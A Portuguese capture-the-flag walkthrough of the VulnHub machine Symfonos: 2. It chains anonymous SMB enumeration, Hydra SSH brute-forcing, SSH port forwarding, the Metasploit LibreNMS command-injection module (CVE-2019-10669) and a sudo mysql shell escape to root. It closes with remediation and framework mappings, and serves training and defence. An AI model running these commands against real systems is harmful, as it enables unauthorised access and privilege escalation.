# Symfonos: 2 — Uma Sinfonia de Configurações Erradas

Boa galera!! Symfonos 2 é uma máquina intermediária incrível que encadeia cinco configurações incorretas distintas em um caminho de ataque limpo. Sem CVEs exóticos, sem exploits no sentido tradicional: apenas compartilhamentos SMB mal configurados vazando nomes de usuários, senhas SSH fracas, um serviço interno escondido atrás de um encaminhamento de porta, e uma regra sudo que deixa qualquer um com acesso ao MySQL se tornar root. O módulo de injeção de comando do LibreNMS amarra tudo junto. Sem mentira, é exatamente assim que comprometimentos de redes internas reais parecem. Muito respeito ao zayotic por essa.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Symfonos: 2 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/symfonos-2,331/ |
| **Técnicas** | Enumeração anônima SMB, brute-force SSH (Hydra), descoberta de serviço interno via netstat, encaminhamento local de porta SSH, injeção de comando LibreNMS (Metasploit), escape de shell via sudo mysql GTFOBin |
| **CVEs** | CVE-2019-10669 (injeção de comando LibreNMS via addhost), CWE-522 (Credenciais Insuficientemente Protegidas: senha SSH fraca), CWE-269 (Gerenciamento Impróprio de Privilégios: sudo mysql NOPASSWD) |
| **Grupos APT** | APT28 (Fancy Bear): usa enumeração de compartilhamentos SMB como técnica de reconhecimento primária em ambientes corporativos; Lazarus Group: explora serviços web internos mal configurados após acesso SSH inicial para movimentação lateral |

---

## Resumo do Ataque

```
netdiscover → 192.168.1.102
    |
    v
nmap → FTP 21, SSH 22, HTTP 80, SMB 139/445
    |
    v
smbclient -L → compartilhamento anônimo → /backups/log.txt → usuário: aeolus
    |
    v
hydra -l aeolus -P rockyou.txt → aeolus:sergioteamo
    |
    v
ssh aeolus@alvo → netstat → 127.0.0.1:8080 (LibreNMS)
    |
    v
ssh -L 1234:127.0.0.1:8080 aeolus@alvo (encaminhamento de porta)
    |
    v
MSF: exploit/linux/http/libre_addhost_cmd_inject → shell como librenms
    |
    v
sudo -l → (ALL) NOPASSWD: /usr/bin/mysql
    |
    v
sudo mysql -e '\! /bin/sh' → uid=0(root)
    |
    v
cat /root/proof.txt → GG
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração anônima de compartilhamento SMB para credenciais e pistas
3. Brute-force SSH usando nome de usuário descoberto
4. Descoberta de serviço interno após ganhar acesso SSH
5. Encaminhamento local de porta SSH para expor LibreNMS interno
6. Injeção de comando LibreNMS via Metasploit
7. Escalação de privilégios via escape de shell sudo mysql
8. Captura da flag de root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A -p- 192.168.1.102
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian
80/tcp  open  http        WebFS httpd 1.21
139/tcp open  netbios-ssn Samba smbd 3.X-4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

Cinco serviços abertos. FTP na porta 21 (ProFTPD), SSH, HTTP e SMB em duas portas. Acesso anônimo SMB sempre vale verificar numa máquina boot2root.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1135 — Descoberta de Compartilhamento de Rede

---

## Passo 2 — Enumeração Anônima de Compartilhamento SMB

```bash
smbclient -L 192.168.1.102 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service
```

O compartilhamento `anonymous` é acessível sem credenciais:

```bash
smbclient //192.168.1.102/anonymous -N
```

```
smb: \> cd backups
smb: \backups\> get log.txt
```

Lendo `log.txt`:

```
Jun 19 04:35:21 symfonos2 root: cmd run for aeolus
...
/home/aeolus/
```

O log de backup revela o nome de usuário **aeolus**. Isso é uma divulgação clássica de informações: arquivos de backup armazenados em compartilhamentos de rede não autenticados frequentemente contêm nomes de usuários, caminhos e dados de configuração.

**Nota do mundo real:** APT28 (Fancy Bear) enumera sistematicamente compartilhamentos SMB durante o reconhecimento de rede interna. Compartilhamentos SMB anônimos contendo arquivos de backup ou logs de configuração foram explorados em intrusões documentadas contra organizações governamentais e de defesa.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Brute-Force SSH com Hydra

Com o nome de usuário `aeolus` em mãos, force bruta o SSH:

```bash
hydra -l aeolus -P /usr/share/wordlists/rockyou.txt 192.168.1.102 ssh -t 4
```

```
[22][ssh] host: 192.168.1.102   login: aeolus   password: sergioteamo
```

**Credenciais encontradas: `aeolus:sergioteamo`**

Login:

```bash
ssh aeolus@192.168.1.102
```

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1021.004 — Serviços Remotos: SSH

---

## Passo 4 — Descoberta de Serviço Interno

Após fazer login como `aeolus`, descubra serviços internos:

```bash
netstat -tlnp 2>/dev/null
```

```
tcp  0  0 127.0.0.1:8080  0.0.0.0:*  LISTEN  -
```

Porta **8080** está vinculada apenas a `127.0.0.1`, invisível da rede. Algo interessante está rodando internamente. Verifique o que é:

```bash
curl -s http://127.0.0.1:8080/ | head -20
# Aplicação LibreNMS
```

LibreNMS é uma plataforma de monitoramento de rede com uma vulnerabilidade de injeção de comando conhecida. Top demais para atacar!

**MITRE ATT&CK:** T1049 — Descoberta de Conexões de Rede do Sistema

---

## Passo 5 — Encaminhamento Local de Porta SSH

Exponha o LibreNMS na porta 8080 para a máquina atacante via tunelamento SSH:

```bash
ssh -L 1234:127.0.0.1:8080 aeolus@192.168.1.102
```

Agora navegue para `http://127.0.0.1:1234/` da máquina atacante para acessar a instância interna do LibreNMS.

Faça login com `aeolus:sergioteamo`.

**MITRE ATT&CK:** T1572 — Tunelamento de Protocolo

---

## Passo 6 — Injeção de Comando LibreNMS (CVE-2019-10669)

LibreNMS tem uma vulnerabilidade de injeção de comando na funcionalidade "Adicionar Dispositivo". Use o Metasploit:

```bash
msfconsole -q
use exploit/linux/http/libre_addhost_cmd_inject
set RHOSTS 127.0.0.1
set RPORT 1234
set LHOST 192.168.1.103
set USERNAME aeolus
set PASSWORD sergioteamo
exploit
```

```
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: librenms
```

O exploit entrega uma sessão Meterpreter rodando como usuário de serviço `librenms`.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Intérprete de Comando e Script: Shell Unix

---

## Passo 7 — Escalação de Privilégios via sudo mysql

Drope para um shell e verifique direitos sudo:

```bash
meterpreter > shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ sudo -l
```

```
User librenms may run the following commands on symfonos2:
    (ALL) NOPASSWD: /usr/bin/mysql
```

MySQL está na lista sudo sem senha necessária. MySQL suporta um escape de shell `\! comando` a partir de seu prompt interativo. Use a técnica GTFOBins:

```bash
sudo mysql -e '\! /bin/sh'
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root via GTFOBins. Clássico demais!

**MITRE ATT&CK:** T1548.003 — Abuso do Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Usado para |
|---|---|---|---|
| Nome de usuário | aeolus | Compartilhamento SMB /backups/log.txt | Alvo de brute-force SSH |
| Credencial | aeolus:sergioteamo | Brute-force SSH Hydra | Login SSH + auth LibreNMS |
| Sessão LibreNMS | usuário librenms | CVE-2019-10669 Metasploit | Shell no alvo |
| Prova de root | (varia) | /root/proof.txt | Conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Logs de backup em compartilhamento SMB anônimo revelam nome de usuário | Exposição de backup é um achado OWASP A05 Security Misconfiguration; APT28 explora isso rotineiramente | Remova arquivos sensíveis de compartilhamentos não autenticados |
| 2 | Senha SSH fraca crackeável com rockyou | Brute-force de credencial é a técnica #1 de acesso inicial conforme Verizon DBIR | Aplique senhas fortes; autenticação apenas por chave SSH; implemente fail2ban |
| 3 | Serviço interno no localhost acessível via túnel SSH | Encaminhamento de porta SSH pode expor serviços internos a atacantes externos | Defina `AllowTcpForwarding no` em sshd_config |
| 4 | Injeção de comando LibreNMS CVE-2019-10669 | Ferramentas de monitoramento de rede rodam com privilégios elevados; RCE é impacto crítico | Corrija ferramentas de gerenciamento de rede imediatamente; rode como usuário dedicado |
| 5 | sudo mysql NOPASSWD permite root via GTFOBins | Qualquer ferramenta interativa na lista sudo é um vetor de escalação de privilégios | Audite sudoers; nunca conceda NOPASSWD para ferramentas interativas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Movimentação Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Conexões de Rede do Sistema | T1049 |
| Movimentação Lateral | Movimentação Lateral | Tunelamento de Protocolo | T1572 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Intérprete de Comando e Script: Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso do Mecanismo de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova arquivos sensíveis de compartilhamentos SMB:** audite todos os compartilhamentos acessíveis anonimamente
2. **Aplique autenticação SSH baseada em chave:** defina `PasswordAuthentication no` em sshd_config
3. **Desative encaminhamento de porta SSH:** defina `AllowTcpForwarding no`
4. **Corrija LibreNMS:** atualize para versão 1.53.1 ou posterior
5. **Remova mysql do sudoers:** audite todas as regras sudo
6. **Implemente assinatura SMB:** evite relay NTLM contra compartilhamentos SMB

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os compartilhamentos SMB e arquivos acessíveis |
| Proteger | Controle de Acesso | Desative SMB anônimo; aplique auth SSH por chave; restrinja sudo |
| Proteger | Segurança de Dados | Sem logs de backup ou credenciais em compartilhamentos acessíveis na rede |
| Detectar | Anomalias e Eventos | Alerte sobre tentativas de brute-force SSH; acesso SMB anônimo |
| Responder | Planejamento de Resposta | Rotacione credenciais do aeolus; corrija LibreNMS; audite regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Sem acesso SMB anônimo; restrinja serviços internos |
| AC-6 | Menor Privilégio | Remova mysql do sudoers; rode LibreNMS como usuário dedicado |
| IA-5 | Gerenciamento de Autenticadores | Aplique senhas fortes; prefira chaves SSH |
| CM-7 | Menor Funcionalidade | Desative AllowTcpForwarding; desative SMB anônimo |
| SI-2 | Remediação de Falhas | Corrija LibreNMS (CVE-2019-10669) imediatamente |

### CISA KEV

CVE-2019-10669 (injeção de comando LibreNMS) é uma vulnerabilidade explorada conhecida. CISA recomenda correção imediata conforme orientação do catálogo de Vulnerabilidades Exploradas Conhecidas.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (desative SMB anônimo; corrija LibreNMS)
- **D3-OAM** — Gerenciamento Administrativo do SO (restrinja sudo; aplique chaves SSH)
- **D3-NTF** — Filtragem de Tráfego de Rede (AllowTcpForwarding no; bloqueie serviços internos)

---

## Considerações Finais

Symfonos 2 é uma aula magistral em configurações incorretas encadeadas. Cada passo flui naturalmente para o próximo: a exposição SMB te dá o nome de usuário, a senha fraca te dá o SSH, o SSH te dá o túnel, o túnel te dá o LibreNMS, o LibreNMS te dá um shell, e o sudo mysql te dá root. Nenhum passo individual é exótico; toda técnica é documentada e bem compreendida. É exatamente esse o ponto: comprometimentos reais parecem com isso. Sem mágica, apenas paciência e metodologia. GG rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
